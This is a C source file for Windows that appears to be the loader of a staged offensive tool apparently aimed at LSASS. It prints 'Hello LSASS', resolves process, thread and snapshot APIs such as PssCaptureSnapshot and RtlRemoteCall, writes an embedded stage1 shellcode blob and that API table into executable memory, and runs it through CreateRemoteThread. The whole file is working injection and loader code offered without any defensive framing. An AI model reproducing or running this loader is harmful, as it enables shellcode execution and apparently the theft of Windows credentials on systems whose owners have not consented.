#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <TlHelp32.h>

#include "stage1.x64.bin.h"

#define UTILS_IMPLEMENTATION
#include "c_utils/utils.h"

typedef struct _global_data
{
    DWORD64 dwCreateToolhelp32Snapshot;
    DWORD64 dwProcess32First;
    DWORD64 dwProcess32Next;
    DWORD64 dwThread32First;
    DWORD64 dwThread32Next;
    DWORD64 dwCloseHandle;
    DWORD64 dwOpenProcess;
    DWORD64 dwOpenThread;
    DWORD64 dwVirtualAllocEx;
    DWORD64 dwVirtualFreeEx;
    DWORD64 dwSuspendThread;
    DWORD64 dwGetThreadContext;
    DWORD64 dwRtlRemoteCall;
    DWORD64 dwResumeThread;
    DWORD64 dwReadProcessMemory;
    DWORD64 dwSleep;
    DWORD64 dwNtContinue;
    DWORD64 dwWriteProcessMemory;
    DWORD64 dwCreateRemoteThread;
    DWORD64 dwDuplicateHandle;
    DWORD64 dwPssCaptureSnapshot;
    DWORD64 dwPssFreeSnapshot;
} GLOBAL_DATA, *PGLOBAL_DATA;

int main(void)
{
    int iRetVal = 0;
    LPVOID lpvStage1Mem = NULL;
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CHAR cSprintfBuffer[1024];
    PSTR cErrMsg = "%sb failed, %d'\n";

    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    if (hKernel == INVALID_HANDLE_VALUE)
    {
        SPRINTF_ARGS sprintfArgs;
        sprintfArgs.args[0] = (DWORD64) "GetModuleHandleA";
        sprintfArgs.args[1] = GetLastError();
        UtilsSprintf(cSprintfBuffer, cErrMsg, sprintfArgs);

        WriteFile(hStdOut, cSprintfBuffer, (DWORD)UtilsStrLen(cSprintfBuffer), NULL, NULL);

        iRetVal = 3;
        goto shutdown;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == INVALID_HANDLE_VALUE)
    {
        SPRINTF_ARGS sprintfArgs;
        sprintfArgs.args[0] = (DWORD64) "GetModuleHandleA";
        sprintfArgs.args[1] = GetLastError();
        UtilsSprintf(cSprintfBuffer, cErrMsg, sprintfArgs);

        WriteFile(hStdOut, cSprintfBuffer, (DWORD)UtilsStrLen(cSprintfBuffer), NULL, NULL);

        iRetVal = 3;
        goto shutdown;
    }

    GLOBAL_DATA globalData = {
        .dwCreateToolhelp32Snapshot = (DWORD64)GetProcAddress(hKernel, "CreateToolhelp32Snapshot"),
        .dwProcess32First = (DWORD64)GetProcAddress(hKernel, "Process32First"),
        .dwProcess32Next = (DWORD64)GetProcAddress(hKernel, "Process32Next"),
        .dwThread32First = (DWORD64)GetProcAddress(hKernel, "Thread32First"),
        .dwThread32Next = (DWORD64)GetProcAddress(hKernel, "Thread32Next"),
        .dwCloseHandle = (DWORD64)GetProcAddress(hKernel, "CloseHandle"),
        .dwOpenProcess = (DWORD64)GetProcAddress(hKernel, "OpenProcess"),
        .dwOpenThread = (DWORD64)GetProcAddress(hKernel, "OpenThread"),
        .dwVirtualAllocEx = (DWORD64)GetProcAddress(hKernel, "VirtualAllocEx"),
        .dwVirtualFreeEx = (DWORD64)GetProcAddress(hKernel, "VirtualFreeEx"),
        .dwSuspendThread = (DWORD64)GetProcAddress(hKernel, "SuspendThread"),
        .dwGetThreadContext = (DWORD64)GetProcAddress(hKernel, "GetThreadContext"),
        .dwRtlRemoteCall = (DWORD64)GetProcAddress(hNtdll, "RtlRemoteCall"),
        .dwResumeThread = (DWORD64)GetProcAddress(hKernel, "ResumeThread"),
        .dwReadProcessMemory = (DWORD64)GetProcAddress(hKernel, "ReadProcessMemory"),
        .dwSleep = (DWORD64)GetProcAddress(hKernel, "Sleep"),
        .dwNtContinue = (DWORD64)GetProcAddress(hNtdll, "NtContinue"),
        .dwWriteProcessMemory = (DWORD64)GetProcAddress(hKernel, "WriteProcessMemory"),
        .dwCreateRemoteThread = (DWORD64)GetProcAddress(hKernel, "CreateRemoteThread"),
        .dwDuplicateHandle = (DWORD64)GetProcAddress(hKernel, "DuplicateHandle"),
        .dwPssCaptureSnapshot = (DWORD64)GetProcAddress(hKernel, "PssCaptureSnapshot"),
        .dwPssFreeSnapshot = (DWORD64)GetProcAddress(hKernel, "PssFreeSnapshot"),
    };

    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        iRetVal = 1;
        goto shutdown;
    }

    LPCSTR cHello = "Hello LSASS\n";
    if (!WriteFile(hStdOut, cHello, (DWORD)UtilsStrLen(cHello), NULL, NULL))
    {
        iRetVal = 2;
        goto shutdown;
    }

    HANDLE hTargetProc = GetCurrentProcess();
    lpvStage1Mem = VirtualAllocEx(hTargetProc, 0, stage1_x64_len + sizeof(globalData), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (lpvStage1Mem == NULL)
    {
        SPRINTF_ARGS sprintfArgs;
        sprintfArgs.args[0] = (DWORD64) "VirtualAllocEx";
        sprintfArgs.args[1] = GetLastError();
        UtilsSprintf(cSprintfBuffer, cErrMsg, sprintfArgs);

        WriteFile(hStdOut, cSprintfBuffer, (DWORD)UtilsStrLen(cSprintfBuffer), NULL, NULL);

        iRetVal = 3;
        goto shutdown;
    }

    if (!WriteProcessMemory(hTargetProc, lpvStage1Mem, stage1_x64, stage1_x64_len, NULL))
    {
        SPRINTF_ARGS sprintfArgs;
        sprintfArgs.args[0] = (DWORD64) "WriteProcessMemory";
        sprintfArgs.args[1] = GetLastError();
        UtilsSprintf(cSprintfBuffer, cErrMsg, sprintfArgs);

        WriteFile(hStdOut, cSprintfBuffer, (DWORD)UtilsStrLen(cSprintfBuffer), NULL, NULL);

        iRetVal = 4;
        goto shutdown;
    }

    if (!WriteProcessMemory(hTargetProc, (LPVOID)((DWORD64)lpvStage1Mem + stage1_x64_len), &globalData, sizeof(globalData), NULL))
    {
        SPRINTF_ARGS sprintfArgs;
        sprintfArgs.args[0] = (DWORD64) "WriteProcessMemory";
        sprintfArgs.args[1] = GetLastError();
        UtilsSprintf(cSprintfBuffer, cErrMsg, sprintfArgs);

        WriteFile(hStdOut, cSprintfBuffer, (DWORD)UtilsStrLen(cSprintfBuffer), NULL, NULL);

        iRetVal = 5;
        goto shutdown;
    }

    HANDLE hThread = CreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvStage1Mem, NULL, 0, NULL);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

shutdown:
    if (lpvStage1Mem != NULL)
    {
        VirtualFreeEx(hTargetProc, lpvStage1Mem, 0, MEM_RELEASE);
    }

    CloseHandle(hStdOut);

    return iRetVal;
}